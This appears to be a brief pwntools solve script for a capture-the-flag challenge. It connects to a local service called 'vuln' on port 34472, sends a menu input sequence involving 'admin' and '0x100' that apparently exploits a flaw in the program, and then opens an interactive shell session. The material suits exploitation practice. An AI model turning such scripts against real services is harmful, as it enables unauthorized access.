from pwn import *
#io = process('./vuln')
io = remote('localhost',34472)
io.sendline(b'1')
io.sendline(b'admin')
io.sendline(b'0x100')
io.sendline(b'4')
io.sendline(b'admin')
io.interactive()

